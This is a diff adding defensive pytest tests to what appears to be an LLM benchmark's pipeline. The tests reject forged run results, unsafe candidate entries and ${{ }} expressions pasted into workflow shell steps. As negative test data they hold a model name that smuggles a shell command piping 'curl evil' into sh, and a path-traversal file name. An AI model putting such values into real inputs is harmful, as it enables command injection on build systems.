@@ -129,3 +129,52 @@ def test_status_badge(tmp_path, monkeypatch):
     pt = json.loads((tmp_path / "status.pt.json").read_text(encoding="utf-8"))
     assert en == {"schemaVersion": 1, "label": "recommended model", "message": "qwen3:4b · 2026-09-30", "color": "brightgreen"}
     assert pt["label"] == "modelo recomendado"
+
+
+def test_each_run_job_can_only_hand_over_its_own_result(tmp_path, monkeypatch):
+    from bench import accept_runs
+    monkeypatch.setattr(accept_runs, "RESULTS_DIR", tmp_path / "results")
+    monkeypatch.setattr(accept_runs, "RUNS_DIR", tmp_path / "results" / "runs")
+    (tmp_path / "results").mkdir()
+    plan = {"entries": [{"label": "a:1b", "slug": "a_1b", "key": "k1", "backend": "ollama"},
+                        {"label": "b:1b", "slug": "b_1b", "key": "k2", "backend": "ollama"}]}
+    (tmp_path / "results" / "plan.json").write_text(json.dumps(plan))
+    art = tmp_path / "art" / "run-a_1b"
+    art.mkdir(parents=True)
+    run = {"key": "k1", "label": "a:1b", "answers": [{"case": "c1", "runs": [
+        {"category": "SP", "seed": 11, "latency_s": 1.0, "reasoning": "x" * 5000}]}]}
+    (art / "a_1b__k1.json").write_text(json.dumps(run))
+    forged = {"key": "k2", "label": "b:1b", "answers": []}  # a fake result for another candidate
+    (art / "b_1b__k2.json").write_text(json.dumps(forged))
+    accept_runs.main(str(tmp_path / "art"))
+    out = tmp_path / "results" / "runs"
+    assert (out / "a_1b__k1.json").exists() and not (out / "b_1b__k2.json").exists()
+    kept = json.loads((out / "a_1b__k1.json").read_text())
+    assert len(kept["answers"][0]["runs"][0]["reasoning"]) <= accept_runs.MAX_TEXT
+
+
+def test_candidate_names_are_checked_and_new_builds_wait():
+    from bench import plan
+    from datetime import datetime, timedelta, timezone
+    assert plan.safe_entry({"backend": "ollama", "label": "qwen3:4b", "model": "qwen3:4b"})
+    assert not plan.safe_entry({"backend": "ollama", "label": "x", "model": "x'; curl evil | sh; '"})
+    assert not plan.safe_entry({"backend": "llamacpp", "label": "g", "model": "g", "hf_repo": "o/r", "hf_file": "../x.gguf"})
+    assert not plan.safe_entry({"backend": "docker", "label": "x", "model": "x"})
+    sel = {"min_age_days_to_adopt": 30, "adopt_backends": ["ollama"]}
+    recent = (datetime.now(timezone.utc) - timedelta(days=3)).isoformat()
+    old = (datetime.now(timezone.utc) - timedelta(days=40)).isoformat()
+    assert score.adoption_hold({"backend": "ollama", "entry": {"first_seen": recent}}, sel)[0] == "age"
+    assert score.adoption_hold({"backend": "llamacpp", "entry": {"first_seen": old}}, sel)[0] == "backend"
+    assert score.adoption_hold({"backend": "ollama", "entry": {"first_seen": old}}, sel) is None
+
+
+def test_workflow_scripts_never_paste_expressions():
+    """Values reach the shell through the environment, never pasted with ${{ }} (SECURITY.md)."""
+    import yaml
+    offenders = []
+    for f in (common.ROOT / ".github").rglob("*.yml"):
+        doc = yaml.safe_load(f.read_text(encoding="utf-8"))
+        steps = [s for job in (doc.get("jobs") or {}).values() for s in job.get("steps", [])]
+        steps += (doc.get("runs") or {}).get("steps", [])
+        offenders += [f"{f.name}: {s.get('name', '')}" for s in steps if "${{" in str(s.get("run", ""))]
+    assert not offenders, offenders
